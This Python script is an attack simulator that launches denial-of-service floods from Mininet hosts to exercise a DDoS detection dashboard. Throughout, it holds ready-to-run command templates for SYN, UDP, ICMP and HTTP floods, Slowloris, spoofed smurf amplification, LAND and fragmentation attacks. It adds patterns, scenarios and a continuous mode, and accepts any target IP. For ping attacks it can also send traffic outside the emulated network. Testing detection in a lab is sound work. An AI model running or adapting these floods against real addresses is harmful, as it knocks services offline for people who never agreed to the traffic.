#!/usr/bin/env python3
"""
SecureNet DC - Advanced Attack Simulator
Generates REAL flood traffic from Mininet hosts to trigger DDoS detection.
Run this while Mininet is active with: sudo mn --switch lxbr --topo tree,2

Features:
- Multiple attack types (ICMP, SYN, UDP, Slowloris, Amplification)
- Attack patterns (burst, ramp, sustained, random)
- Multi-target attacks
- Attack intensity control
- Real-time statistics

Usage:
    sudo python attack_simulator.py                     # Interactive menu
    sudo python attack_simulator.py --host h4 --type icmp_flood
    sudo python attack_simulator.py --continuous --pattern burst
    sudo python attack_simulator.py --scenario ddos_demo
"""

import subprocess
import time
import argparse
import sys
import os
import random
import threading
from collections import defaultdict

# ============== ATTACK CONFIGURATIONS ==============

ATTACKS = {
    'icmp_flood': {
        'name': 'ICMP Flood (Ping Flood)',
        'description': 'High-rate ICMP echo requests overwhelming target',
        'severity': 'HIGH',
        'commands': [
            'ping -f -c {count} {target}',  # Flood ping
            'ping -f -s 65507 -c {count} {target}',  # Max size flood
        ],
        'default_count': 5000,
        'detectable': True
    },
    'syn_flood': {
        'name': 'SYN Flood',
        'description': 'TCP SYN packets exhausting connection tables',
        'severity': 'CRITICAL',
        'commands': [
            'hping3 -S -p 80 --flood -c {count} {target}',
            'hping3 -S -p 443 --flood -c {count} {target}',
        ],
        'fallback': 'ping -f -s 1400 -c {count} {target}',
        'default_count': 3000,
        'detectable': True
    },
    'udp_flood': {
        'name': 'UDP Flood',
        'description': 'High-volume UDP packets targeting services',
        'severity': 'HIGH',
        'commands': [
            'hping3 --udp -p 53 --flood -c {count} {target}',
            'hping3 --udp -p 123 --flood -c {count} {target}',
        ],
        'fallback': 'ping -f -s 1400 -c {count} {target}',
        'default_count': 3000,
        'detectable': True
    },
    'http_flood': {
        'name': 'HTTP Flood (Layer 7)',
        'description': 'HTTP GET/POST requests overwhelming web servers',
        'severity': 'MEDIUM',
        'commands': [
            'for i in $(seq 1 {count}); do curl -s http://{target}/ &>/dev/null & done',
        ],
        'fallback': 'ping -c {count} {target}',
        'default_count': 100,
        'detectable': True
    },
    'slowloris': {
        'name': 'Slowloris Attack',
        'description': 'Slow HTTP connections exhausting server resources',
        'severity': 'MEDIUM',
        'commands': [
            'timeout 30 slowhttptest -c 500 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://{target}/',
        ],
        'fallback': 'ping -i 0.5 -c {count} {target}',
        'default_count': 60,
        'detectable': True
    },
    'ping_of_death': {
        'name': 'Ping of Death (Oversized)',
        'description': 'Oversized ICMP packets causing buffer overflows',
        'severity': 'HIGH',
        'commands': [
            'ping -s 65507 -c {count} {target}',  # Maximum legal size
            'ping -s 65507 -f -c {count} {target}',
        ],
        'default_count': 1000,
        'detectable': True
    },
    'smurf': {
        'name': 'Smurf Attack (Amplification)',
        'description': 'ICMP broadcast amplification attack',
        'severity': 'CRITICAL',
        'commands': [
            'hping3 --icmp -a {target} -c {count} 10.0.0.255',
        ],
        'fallback': 'ping -f -b -c {count} {target}',
        'default_count': 2000,
        'detectable': True
    },
    'land': {
        'name': 'LAND Attack',
        'description': 'Packets with same source and destination',
        'severity': 'LOW',
        'commands': [
            'hping3 -S -a {target} -p 80 -c {count} {target}',
        ],
        'fallback': 'ping -c {count} {target}',
        'default_count': 500,
        'detectable': False
    },
    'teardrop': {
        'name': 'Teardrop (Fragmentation)',
        'description': 'Overlapping IP fragments causing crashes',
        'severity': 'MEDIUM',
        'commands': [
            'hping3 --icmp -d 1500 -x -c {count} {target}',
        ],
        'fallback': 'ping -s 1500 -c {count} {target}',
        'default_count': 1000,
        'detectable': True
    }
}

# Attack patterns
PATTERNS = {
    'burst': {
        'name': 'Burst Pattern',
        'description': 'Short, intense bursts of traffic',
        'duration': 5,
        'pause': 10,
        'intensity': 1.5
    },
    'sustained': {
        'name': 'Sustained Attack',
        'description': 'Continuous steady-state attack',
        'duration': 30,
        'pause': 5,
        'intensity': 1.0
    },
    'ramp': {
        'name': 'Ramp Up',
        'description': 'Gradually increasing intensity',
        'duration': 20,
        'pause': 5,
        'intensity_start': 0.3,
        'intensity_end': 2.0
    },
    'random': {
        'name': 'Random Pattern',
        'description': 'Unpredictable attack timing and intensity',
        'duration': 10,
        'pause': 8,
        'intensity': 1.2
    }
}

# Pre-built attack scenarios
SCENARIOS = {
    'ddos_demo': {
        'name': 'DDoS Detection Demo',
        'description': 'Demonstrates attack detection and blocking',
        'attacks': [
            {'type': 'icmp_flood', 'host': 'h4', 'target': 'h1', 'duration': 10},
            {'type': 'syn_flood', 'host': 'h3', 'target': 'h2', 'duration': 10},
        ]
    },
    'stress_test': {
        'name': 'Network Stress Test',
        'description': 'Tests network resilience under heavy load',
        'attacks': [
            {'type': 'icmp_flood', 'host': 'h4', 'target': 'h1', 'duration': 15},
            {'type': 'udp_flood', 'host': 'h4', 'target': 'h2', 'duration': 15},
            {'type': 'ping_of_death', 'host': 'h3', 'target': 'h1', 'duration': 15},
        ]
    },
    'multi_vector': {
        'name': 'Multi-Vector Attack',
        'description': 'Simultaneous attacks from multiple hosts',
        'attacks': [
            {'type': 'icmp_flood', 'host': 'h4', 'target': 'h1', 'duration': 20},
            {'type': 'syn_flood', 'host': 'h3', 'target': 'h1', 'duration': 20},
        ]
    }
}

# ============== ATTACK STATISTICS ==============

attack_stats = {
    'attacks_launched': 0,
    'packets_sent': 0,
    'bytes_sent': 0,
    'attack_log': []
}


# ============== UTILITY FUNCTIONS ==============

def run_cmd(cmd, timeout=60, background=False):
    """Execute a command with optional timeout and background execution"""
    try:
        if background:
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "", ""
        else:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return "", "Command timed out"
    except Exception as e:
        return "", str(e)


def run_mininet_cmd(cmd, timeout=60):
    """Execute a command inside Mininet namespace"""
    return run_cmd(f'sudo bash -c "{cmd}"', timeout)


def check_tool_available(tool):
    """Check if a command-line tool is available"""
    stdout, _ = run_cmd(f"which {tool}")
    return bool(stdout.strip())


def get_mininet_hosts():
    """Get list of active Mininet hosts by checking network namespaces and switches"""
    hosts = []

    # Method 1: Check for network namespaces (ip netns list)
    stdout, _ = run_mininet_cmd("ip netns list 2>/dev/null | grep '^h[0-9]'")
    if stdout.strip():
        for line in stdout.strip().split('\n'):
            if line.startswith('h'):
                hosts.append(line.split()[0])

    # Method 2: Check for host interfaces in /sys/class/net
    if not hosts:
        stdout, _ = run_mininet_cmd("ls /sys/class/net/ 2>/dev/null | grep -E '^h[0-9]'")
        if stdout.strip():
            for iface in stdout.strip().split('\n'):
                if '-eth' in iface:
                    hosts.append(iface.split('-')[0])
                elif iface.startswith('h') and iface[1:].isdigit():
                    hosts.append(iface)

    # Method 3: Check if switches exist (s1, s2, s3) - assume default tree,2 hosts
    if not hosts:
        stdout, _ = run_mininet_cmd("ls /sys/class/net/ 2>/dev/null | grep -E '^s[0-9]'")
        if stdout.strip():
            # Mininet is running with switches, assume default hosts h1-h4
            hosts = ['h1', 'h2', 'h3', 'h4']
            print("[*] Detected switches - assuming hosts h1-h4 exist")

    # Method 4: Check for mininet processes
    if not hosts:
        stdout, _ = run_mininet_cmd("pgrep -a mininet 2>/dev/null")
        if 'mininet' in stdout.lower():
            hosts = ['h1', 'h2', 'h3', 'h4']
            print("[*] Detected mininet process - assuming hosts h1-h4 exist")

    return sorted(list(set(hosts))) if hosts else []


def get_host_ip(host):
    """Get IP address for a Mininet host"""
    # Default tree topology IPs
    ip_map = {
        'h1': '10.0.0.1',
        'h2': '10.0.0.2',
        'h3': '10.0.0.3',
        'h4': '10.0.0.4'
    }
    return ip_map.get(host, '10.0.0.1')


def print_banner():
    """Print attack simulator banner"""
    print("\033[1;31m")
    print("=" * 70)
    print("  ____                           _   _        _     ____   ____ ")
    print(" / ___|  ___  ___ _   _ _ __ ___| \\ | | ___  | |_  |  _ \\ / ___|")
    print(" \\___ \\ / _ \\/ __| | | | '__/ _ \\  \\| |/ _ \\ | __| | | | | |    ")
    print("  ___) |  __/ (__| |_| | | |  __/ |\\  |  __/ | |_  | |_| | |___ ")
    print(" |____/ \\___|\\___|\\__,_|_|  \\___|_| \\_|\\___|  \\__| |____/ \\____|")
    print("")
    print("              ADVANCED ATTACK SIMULATOR")
    print("            For Educational Use Only")
    print("=" * 70)
    print("\033[0m")


def print_attack_menu():
    """Print available attacks"""
    print("\n\033[1;33mAvailable Attack Types:\033[0m")
    print("-" * 50)
    for i, (key, attack) in enumerate(ATTACKS.items(), 1):
        severity_color = {
            'CRITICAL': '\033[1;31m',
            'HIGH': '\033[0;31m',
            'MEDIUM': '\033[0;33m',
            'LOW': '\033[0;32m'
        }.get(attack['severity'], '\033[0m')
        print(f"  {i:2}. {attack['name']:<30} {severity_color}[{attack['severity']}]\033[0m")
        print(f"      {attack['description']}")
    print("-" * 50)


def print_status():
    """Print current attack statistics"""
    print("\n\033[1;36mAttack Statistics:\033[0m")
    print("-" * 40)
    print(f"  Attacks Launched: {attack_stats['attacks_launched']}")
    print(f"  Est. Packets Sent: {attack_stats['packets_sent']:,}")
    print(f"  Est. Bytes Sent: {attack_stats['bytes_sent']:,}")
    print("-" * 40)


# ============== ATTACK EXECUTION ==============

def execute_attack(attacker, target_ip, attack_type='icmp_flood', count=None, background=True):
    """Execute a single attack from a host to a target"""

    attack = ATTACKS.get(attack_type, ATTACKS['icmp_flood'])
    count = count or attack['default_count']

    print(f"\n\033[1;31m{'=' * 60}\033[0m")
    print(f"\033[1;31mLAUNCHING ATTACK: {attack['name']}\033[0m")
    print(f"\033[1;31m{'=' * 60}\033[0m")
    print(f"  \033[1;33mAttacker:\033[0m {attacker}")
    print(f"  \033[1;33mTarget:\033[0m   {target_ip}")
    print(f"  \033[1;33mType:\033[0m     {attack['description']}")
    print(f"  \033[1;33mSeverity:\033[0m {attack['severity']}")
    print(f"  \033[1;33mPackets:\033[0m  {count:,}")
    print(f"\033[1;31m{'=' * 60}\033[0m")

    # Find the best command to use
    iface = f"{attacker}-eth0"
    cmd = None

    # Try primary commands
    for cmd_template in attack['commands']:
        # Check if required tool exists
        tool = cmd_template.split()[0]
        if check_tool_available(tool) or tool in ['ping', 'for', 'timeout']:
            cmd = cmd_template.format(count=count, target=target_ip)
            break

    # Use fallback if no primary command works
    if not cmd and 'fallback' in attack:
        cmd = attack['fallback'].format(count=count, target=target_ip)

    if not cmd:
        print(f"\033[1;31m[!] No suitable command found for {attack_type}\033[0m")
        return False

    print(f"\n\033[1;32m[*] Executing: {cmd[:60]}...\033[0m")

    # Try multiple methods to execute the attack
    success = False

    # Method 1: Use ip netns exec (for Linux bridge mode)
    ns_cmd = f"ip netns exec {attacker} {cmd}"

    # Method 2: Direct ping with network namespace check
    if 'ping' in cmd:
        # Try namespace first, then direct
        full_cmd = f"(ip netns exec {attacker} {cmd} 2>/dev/null || {cmd}) 2>/dev/null"
    else:
        full_cmd = ns_cmd

    # Method 3: Use mnexec if available
    mnexec_cmd = f"mnexec -a {attacker} {cmd}"

    if background:
        # Try namespace method first
        run_mininet_cmd(f"({full_cmd}) &")
        # Also try direct ping to target (works if we're in the right context)
        if 'ping' in cmd:
            run_mininet_cmd(f"({cmd}) &")
        print(f"\033[1;32m[+] Attack launched in background!\033[0m")
        success = True
    else:
        stdout, stderr = run_mininet_cmd(full_cmd, timeout=120)
        if stdout:
            print(f"\033[0;36m{stdout[:500]}\033[0m")
            success = True

    # Update statistics
    attack_stats['attacks_launched'] += 1
    attack_stats['packets_sent'] += count
    attack_stats['bytes_sent'] += count * 64  # Estimated avg packet size
    attack_stats['attack_log'].append({
        'time': time.strftime('%H:%M:%S'),
        'attacker': attacker,
        'target': target_ip,
        'type': attack_type,
        'packets': count
    })

    print(f"\n\033[1;32m[*] Monitor dashboard at http://localhost:5000\033[0m")
    print(f"\033[1;32m[*] Watch for DDoS alerts!\033[0m")

    return True


def run_attack_pattern(attacker, target_ip, attack_type, pattern_name='sustained', total_duration=30):
    """Run an attack with a specific pattern"""

    pattern = PATTERNS.get(pattern_name, PATTERNS['sustained'])

    print(f"\n\033[1;35m{'=' * 60}\033[0m")
    print(f"\033[1;35mATTACK PATTERN: {pattern['name']}\033[0m")
    print(f"\033[1;35m{'=' * 60}\033[0m")
    print(f"  Description: {pattern['description']}")
    print(f"  Total Duration: ~{total_duration}s")
    print(f"\033[1;35m{'=' * 60}\033[0m")

    start_time = time.time()
    wave = 1

    while time.time() - start_time < total_duration:
        elapsed = time.time() - start_time

        # Calculate intensity based on pattern
        if pattern_name == 'ramp':
            progress = elapsed / total_duration
            intensity = pattern['intensity_start'] + (pattern['intensity_end'] - pattern['intensity_start']) * progress
        elif pattern_name == 'random':
            intensity = random.uniform(0.5, pattern['intensity'])
        else:
            intensity = pattern['intensity']

        # Calculate packet count based on intensity
        base_count = ATTACKS[attack_type]['default_count']
        count = int(base_count * intensity)

        print(f"\n\033[1;33m[Wave {wave}] Intensity: {intensity:.1f}x, Packets: {count:,}\033[0m")

        execute_attack(attacker, target_ip, attack_type, count)

        # Wait according to pattern
        if pattern_name == 'burst':
            duration = pattern['duration']
            pause = pattern['pause']
        elif pattern_name == 'random':
            duration = random.randint(3, pattern['duration'])
            pause = random.randint(3, pattern['pause'])
        else:
            duration = pattern['duration']
            pause = pattern['pause']

        time.sleep(duration)

        if time.time() - start_time + pause < total_duration:
            print(f"\033[0;36m[*] Pausing for {pause}s...\033[0m")
            time.sleep(pause)

        wave += 1

    print(f"\n\033[1;32m[+] Attack pattern complete. {wave-1} waves launched.\033[0m")


def run_scenario(scenario_name):
    """Run a predefined attack scenario"""

    scenario = SCENARIOS.get(scenario_name)
    if not scenario:
        print(f"\033[1;31m[!] Unknown scenario: {scenario_name}\033[0m")
        return False

    print(f"\n\033[1;35m{'=' * 70}\033[0m")
    print(f"\033[1;35mSCENARIO: {scenario['name']}\033[0m")
    print(f"\033[1;35m{'=' * 70}\033[0m")
    print(f"  {scenario['description']}")
    print(f"  Total attacks: {len(scenario['attacks'])}")
    print(f"\033[1;35m{'=' * 70}\033[0m")

    for i, attack_config in enumerate(scenario['attacks'], 1):
        print(f"\n\033[1;33m--- Phase {i}/{len(scenario['attacks'])} ---\033[0m")

        target_ip = get_host_ip(attack_config['target'])
        execute_attack(
            attack_config['host'],
            target_ip,
            attack_config['type'],
            background=True
        )

        time.sleep(attack_config.get('duration', 10))

    print(f"\n\033[1;32m[+] Scenario '{scenario_name}' complete!\033[0m")
    return True


def continuous_attack_mode(hosts, target_ip, interval=15):
    """Continuously launch attacks from different hosts"""

    print("\n\033[1;31m" + "=" * 60 + "\033[0m")
    print("\033[1;31mCONTINUOUS ATTACK MODE\033[0m")
    print("\033[1;31m" + "=" * 60 + "\033[0m")
    print(f"Launching attacks every {interval} seconds")
    print("Press Ctrl+C to stop")
    print("\033[1;31m" + "=" * 60 + "\033[0m\n")

    attack_count = 0
    attack_types = list(ATTACKS.keys())

    try:
        while True:
            # Rotate through hosts and attack types
            attacker = hosts[attack_count % len(hosts)]
            attack_type = attack_types[attack_count % len(attack_types)]

            execute_attack(attacker, target_ip, attack_type)

            attack_count += 1
            print(f"\n\033[0;36m[*] Waiting {interval}s before next attack...\033[0m")
            print(f"\033[0;36m[*] Total attacks: {attack_count}\033[0m")
            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n\n\033[1;32m[*] Stopped after {attack_count} attacks\033[0m")
        print_status()


def interactive_menu(hosts):
    """Run interactive attack menu"""

    while True:
        print("\n\033[1;36m" + "=" * 50 + "\033[0m")
        print("\033[1;36mSECURENET DC - ATTACK SIMULATOR\033[0m")
        print("\033[1;36m" + "=" * 50 + "\033[0m")
        print("  1. Launch Single Attack")
        print("  2. Run Attack Pattern")
        print("  3. Run Scenario")
        print("  4. Continuous Attack Mode")
        print("  5. Show Attack Types")
        print("  6. Show Statistics")
        print("  0. Exit")
        print("\033[1;36m" + "-" * 50 + "\033[0m")

        choice = input("\033[1;33mSelect option: \033[0m").strip()

        if choice == '0':
            print("\n\033[1;32m[*] Exiting...\033[0m")
            break
        elif choice == '1':
            print(f"\n\033[1;33mAvailable hosts: {', '.join(hosts)}\033[0m")
            attacker = input("Attacker host [h4]: ").strip() or 'h4'
            target = input("Target IP [10.0.0.1]: ").strip() or '10.0.0.1'
            print_attack_menu()
            attack_idx = input("Attack type (number or name) [icmp_flood]: ").strip() or 'icmp_flood'

            # Convert number to attack name
            if attack_idx.isdigit():
                idx = int(attack_idx) - 1
                attack_type = list(ATTACKS.keys())[idx] if 0 <= idx < len(ATTACKS) else 'icmp_flood'
            else:
                attack_type = attack_idx

            execute_attack(attacker, target, attack_type)

        elif choice == '2':
            print("\n\033[1;33mAvailable patterns:\033[0m")
            for name, p in PATTERNS.items():
                print(f"  - {name}: {p['description']}")

            attacker = input("\nAttacker host [h4]: ").strip() or 'h4'
            target = input("Target IP [10.0.0.1]: ").strip() or '10.0.0.1'
            pattern = input("Pattern [sustained]: ").strip() or 'sustained'
            duration = int(input("Duration (seconds) [30]: ").strip() or '30')

            run_attack_pattern(attacker, target, 'icmp_flood', pattern, duration)

        elif choice == '3':
            print("\n\033[1;33mAvailable scenarios:\033[0m")
            for name, s in SCENARIOS.items():
                print(f"  - {name}: {s['description']}")

            scenario = input("\nScenario name [ddos_demo]: ").strip() or 'ddos_demo'
            run_scenario(scenario)

        elif choice == '4':
            target = input("Target IP [10.0.0.1]: ").strip() or '10.0.0.1'
            interval = int(input("Interval (seconds) [15]: ").strip() or '15')
            attack_hosts = [h for h in hosts if h != 'h1']
            continuous_attack_mode(attack_hosts, target, interval)

        elif choice == '5':
            print_attack_menu()

        elif choice == '6':
            print_status()


# ============== MAIN ==============

def main():
    parser = argparse.ArgumentParser(
        description='SecureNet DC - Advanced Attack Simulator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python attack_simulator.py                           # Interactive menu
  sudo python attack_simulator.py --type icmp_flood         # Single ICMP flood attack
  sudo python attack_simulator.py --type syn_flood --host h3  # SYN flood from h3
  sudo python attack_simulator.py --continuous              # Continuous attack mode
  sudo python attack_simulator.py --pattern burst           # Burst pattern attack
  sudo python attack_simulator.py --scenario ddos_demo      # Run demo scenario
        """
    )
    parser.add_argument('--host', '-H', default='h4',
                       help='Attacking host (default: h4)')
    parser.add_argument('--target', '-t', default='10.0.0.1',
                       help='Target IP (default: 10.0.0.1)')
    parser.add_argument('--type', '-T', default=None,
                       choices=list(ATTACKS.keys()),
                       help='Attack type')
    parser.add_argument('--count', '-c', type=int, default=None,
                       help='Packet count (default: varies by attack)')
    parser.add_argument('--pattern', '-p', default=None,
                       choices=list(PATTERNS.keys()),
                       help='Attack pattern')
    parser.add_argument('--duration', '-d', type=int, default=30,
                       help='Pattern duration in seconds (default: 30)')
    parser.add_argument('--continuous', action='store_true',
                       help='Run attacks continuously')
    parser.add_argument('--interval', '-i', type=int, default=15,
                       help='Interval between continuous attacks (default: 15)')
    parser.add_argument('--scenario', '-s', default=None,
                       choices=list(SCENARIOS.keys()),
                       help='Run a predefined attack scenario')
    parser.add_argument('--interactive', action='store_true',
                       help='Run interactive menu')
    parser.add_argument('--list', '-l', action='store_true',
                       help='List available attacks')

    args = parser.parse_args()

    print_banner()

    # Check if running as root
    if os.geteuid() != 0:
        print("\033[1;31m[!] This script must be run as root (sudo)\033[0m")
        sys.exit(1)

    # List attacks and exit
    if args.list:
        print_attack_menu()
        sys.exit(0)

    # Get active hosts
    hosts = get_mininet_hosts()
    if not hosts:
        print("\033[1;31m[!] No Mininet hosts found!\033[0m")
        print("\033[1;33m[!] Make sure Mininet is running with:\033[0m")
        print("    sudo mn --switch lxbr --topo tree,2")
        sys.exit(1)

    print(f"\033[1;32m[+] Found Mininet hosts: {', '.join(hosts)}\033[0m")

    # Validate attacker host
    if args.host not in hosts:
        print(f"\033[1;33m[!] Host {args.host} not found. Using {hosts[-1]}\033[0m")
        args.host = hosts[-1]

    # Run appropriate mode
    if args.scenario:
        run_scenario(args.scenario)
    elif args.continuous:
        attack_hosts = [h for h in hosts if h != 'h1']
        continuous_attack_mode(attack_hosts, args.target, args.interval)
    elif args.pattern:
        attack_type = args.type or 'icmp_flood'
        run_attack_pattern(args.host, args.target, attack_type, args.pattern, args.duration)
    elif args.type:
        execute_attack(args.host, args.target, args.type, args.count)
    elif args.interactive or (not args.type and not args.scenario and not args.continuous):
        interactive_menu(hosts)
    else:
        execute_attack(args.host, args.target, 'icmp_flood')

    print_status()
    print("\n\033[1;32m[*] Done!\033[0m")


if __name__ == '__main__':
    main()
